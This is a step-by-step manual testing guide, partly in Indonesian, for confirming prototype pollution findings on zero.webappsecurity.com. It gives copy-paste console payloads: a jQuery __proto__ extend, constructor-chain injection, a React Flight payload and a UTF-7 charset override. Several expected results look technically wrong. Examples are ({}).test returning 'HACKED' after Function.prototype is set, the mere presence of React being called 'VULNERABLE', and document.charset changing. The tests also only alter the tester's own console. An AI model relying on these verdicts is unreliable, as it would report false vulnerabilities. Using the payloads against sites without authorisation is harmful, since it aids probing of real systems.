# 🎬 PPMAP Manual Testing - STEP BY STEP VIDEO GUIDE

> Panduan visual cara testing manual hasil scan

---

## 📺 VIDEO GUIDE - jQuery Prototype Pollution Testing

### ⏱️ TIMING: 2 Menit

#### STEP 1: Setup (15 detik)
```
1. ✓ Buka browser: http://zero.webappsecurity.com/
2. ✓ Tekan F12 (atau Ctrl+Shift+J)
3. ✓ Klik "Console" tab
4. ✓ Pastikan tidak ada error messages
```

**Expected Screen:**
```
┌─────────────────────────────────────────────────────┐
│ Console Tab - http://zero.webappsecurity.com/       │
├─────────────────────────────────────────────────────┤
│ >>_                                                 │
│                                                     │
│ (cursor blinking, ready for input)                  │
└─────────────────────────────────────────────────────┘
```

---

#### STEP 2: Check jQuery Version (30 detik)
```javascript
// TYPE THIS IN CONSOLE:
jQuery.fn.jquery

// EXPECTED OUTPUT:
1.8.2  ✓ (jika ada, jQuery terdeteksi)
```

**Screenshot Expected:**
```
┌─────────────────────────────────────────────────────┐
│ >> jQuery.fn.jquery                                 │
│ "1.8.2"                                             │
└─────────────────────────────────────────────────────┘
```

---

#### STEP 3: Run Vulnerability Test (45 detik)
```javascript
// COPY & PASTE INI:
$.extend(true, {}, {"__proto__": {"polluted": "YES"}});

// TEKAN ENTER
```

**Expected:**
```
┌─────────────────────────────────────────────────────┐
│ >> $.extend(true, {}, {"__proto__": {"polluted": ...│
│ undefined   ← OK (ini expected)                      │
└─────────────────────────────────────────────────────┘
```

---

#### STEP 4: Verify Vulnerability (30 detik)
```javascript
// SEKARANG TYPE INI:
Object.prototype.polluted

// TEKAN ENTER
```

**Expected Output - VULNERABLE:**
```
┌─────────────────────────────────────────────────────┐
│ >> Object.prototype.polluted                        │
│ "YES"   ← ✓✓✓ VULNERABLE!                           │
└─────────────────────────────────────────────────────┘
```

**If Output:**
- `"YES"` = ✅ **VULNERABLE** (Prototype Pollution Works!)
- `undefined` = ✅ **SAFE** (Not vulnerable)

---

### 📸 Real Screenshot Example

```
┌──────────────────────────────────────────────────────────┐
│ ☰  zero.webappsecurity.com     Inspector  Console ▼ |_|  │
├──────────────────────────────────────────────────────────┤
│ Filter messages...                                   [⚙]  │
├──────────────────────────────────────────────────────────┤
│                                                           │
│ >> jQuery.fn.jquery                                      │
│ "1.8.2"                                                  │
│                                                           │
│ >> $.extend(true, {}, {"__proto__": {"polluted": "YES"}}); │
│ undefined                                                │
│                                                           │
│ >> Object.prototype.polluted                             │
│ "YES"    ← ✅ VULNERABLE DETECTED!                       │
│                                                           │
│ >>_                                                      │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

---

## 📺 VIDEO GUIDE 2 - Function.prototype Testing

### ⏱️ TIMING: 2 Menit

#### STEP 1: Check Constructor Chain
```javascript
// Copy & paste:
constructor.constructor.prototype.test = "HACKED"

// Expected output:
"HACKED"
```

#### STEP 2: Verify Pollution
```javascript
// Type:
({}).test

// EXPECTED:
// "HACKED"  ← ✅ VULNERABLE
```

**Full Console Output:**
```
┌──────────────────────────────────────────────────────┐
│ >> constructor.constructor.prototype.test = "HACKED"   │
│ "HACKED"                                             │
│                                                      │
│ >> ({}).test                                        │
│ "HACKED"  ← ✅ VULNERABLE!                           │
└──────────────────────────────────────────────────────┘
```

---

#### STEP 3: Advanced Test - __proto__ Access
```javascript
// Copy:
({})._\_\_proto\_\_\_.constructor.prototype.advanced = "POLLUTED"

// Verify:
({}).advanced

// EXPECTED:
// "POLLUTED"  ← ✅ VULNERABLE
```

---

## 📺 VIDEO GUIDE 3 - React Flight Protocol

### ⏱️ TIMING: 1 Menit

#### STEP 1: Check if React Exists
```javascript
typeof React !== 'undefined' ? "REACT FOUND" : "NO REACT"

// EXPECTED:
// "REACT FOUND"  ← ✅ VULNERABLE
```

**Console Output:**
```
┌──────────────────────────────────────────────────────┐
│ >> typeof React !== 'undefined' ? "REACT FOUND" : ...│
│ "REACT FOUND"   ← ✅ React Flight likely vulnerable │
└──────────────────────────────────────────────────────┘
```

#### STEP 2: Flight Protocol Payload
```javascript
const payload = {"_formData": {"get": "$1:then:constructor"}}
JSON.stringify(payload)

// EXPECTED:
// JSON string with constructor chain accessible
```

---

## 📺 VIDEO GUIDE 4 - Charset Override Testing

### ⏱️ TIMING: 1 Menit

#### STEP 1: Inject Charset
```javascript
Object.prototype.charset = "utf-7"

// Expected:
// "utf-7"
```

#### STEP 2: Verify Override
```javascript
document.charset

// EXPECTED:
// "utf-7"  ← ✅ VULNERABLE
```

**Console Output:**
```
┌──────────────────────────────────────────────────────┐
│ >> Object.prototype.charset = "utf-7"               │
│ "utf-7"                                              │
│                                                      │
│ >> document.charset                                  │
│ "utf-7"  ← ✅ UTF-7 Override successful!            │
└──────────────────────────────────────────────────────┘
```

---

## 🎯 FULL TESTING WORKFLOW

### Flow Diagram:
```
START
  │
  ├─→ [STEP 1] Open Console
  │     │
  │     └─→ Check: F12 → Console Ready ✓
  │
  ├─→ [STEP 2] Test jQuery PP
  │     │
  │     ├─→ Run: $.extend(...)
  │     │
  │     └─→ Verify: Object.prototype.polluted
  │           Result: "YES" = VULNERABLE ✓
  │
  ├─→ [STEP 3] Test Function.proto
  │     │
  │     ├─→ Run: constructor.constructor.prototype.test = "HACKED"
  │     │
  │     └─→ Verify: ({}).test
  │           Result: "HACKED" = VULNERABLE ✓
  │
  ├─→ [STEP 4] Test React Flight
  │     │
  │     └─→ Check: typeof React !== 'undefined'
  │           Result: "REACT FOUND" = VULNERABLE ✓
  │
  ├─→ [STEP 5] Test Charset
  │     │
  │     ├─→ Run: Object.prototype.charset = "utf-7"
  │     │
  │     └─→ Verify: document.charset
  │           Result: "utf-7" = VULNERABLE ✓
  │
  └─→ [FINAL] Document All Results
        │
        └─→ Create Screenshot Report ✓
```

---

## 📋 RESULT DOCUMENTATION TEMPLATE

After each test, fill this form:

```
═══════════════════════════════════════════════════════
TEST: jQuery Prototype Pollution (CVE-2019-11358)
═══════════════════════════════════════════════════════
Status: [ ] VULNERABLE  [ ] SAFE

Step 1: jQuery.fn.jquery
  Input:  jQuery.fn.jquery
  Output: _____________________
  Expected: 1.8.2 (or any version < 3.5.0)

Step 2: Inject Payload
  Input:  $.extend(true, {}, {"__proto__": {"polluted": "YES"}});
  Output: _____________________
  Expected: undefined (this is normal)

Step 3: Verify
  Input:  Object.prototype.polluted
  Output: _____________________
  Expected: "YES"

CONCLUSION: [ ] VULNERABLE ✓  [ ] SAFE

═══════════════════════════════════════════════════════
TEST: Function.prototype Chain
═══════════════════════════════════════════════════════
Status: [ ] VULNERABLE  [ ] SAFE

Step 1: Inject
  Input:  constructor.constructor.prototype.test = "HACKED"
  Output: _____________________
  Expected: "HACKED"

Step 2: Verify
  Input:  ({}).test
  Output: _____________________
  Expected: "HACKED"

CONCLUSION: [ ] VULNERABLE ✓  [ ] SAFE

═══════════════════════════════════════════════════════
TEST: React Flight Protocol
═══════════════════════════════════════════════════════
Status: [ ] VULNERABLE  [ ] SAFE

Check React:
  Input:  typeof React !== 'undefined' ? "FOUND" : "NOT"
  Output: _____________________
  Expected: "FOUND"

CONCLUSION: [ ] VULNERABLE ✓  [ ] SAFE

═══════════════════════════════════════════════════════
TEST: UTF-7 Charset Override
═══════════════════════════════════════════════════════
Status: [ ] VULNERABLE  [ ] SAFE

Inject:
  Input:  Object.prototype.charset = "utf-7"
  Output: _____________________
  Expected: "utf-7"

Verify:
  Input:  document.charset
  Output: _____________________
  Expected: "utf-7"

CONCLUSION: [ ] VULNERABLE ✓  [ ] SAFE
```

---

## 🎥 Video Timestamp Guide

Jika recording:

- **0:00-0:15** - Open browser & console
- **0:15-0:45** - jQuery version check
- **0:45-1:30** - Run jQuery PP payload
- **1:30-2:00** - Verify vulnerability
- **2:00-2:30** - Function.proto test
- **2:30-3:00** - React check
- **3:00-3:30** - Charset override
- **3:30-4:00** - Document results

Total: ~4 minutes per target

---

## ✅ Success Indicators

You're **VULNERABLE** if you see:

```javascript
✓ Object.prototype.polluted === "YES"
✓ ({}).test === "HACKED"
✓ typeof React !== 'undefined' === true
✓ document.charset === "utf-7"
```

---

## 🎯 Copy-Paste Complete Workflow

Jalankan ini satu per satu:

```javascript
// 1. Check jQuery
jQuery.fn.jquery

// 2. Test PP
$.extend(true, {}, {"__proto__": {"polluted": "YES"}});
Object.prototype.polluted

// 3. Test Function.proto
constructor.constructor.prototype.test = "HACKED";
({}).test

// 4. Check React
typeof React !== 'undefined' ? "FOUND" : "NOT"

// 5. Test Charset
Object.prototype.charset = "utf-7";
document.charset

// 6. Cleanup
delete Object.prototype.polluted
delete Object.prototype.test
delete Object.prototype.charset
```

---

**Now you're ready for manual testing!** 🚀

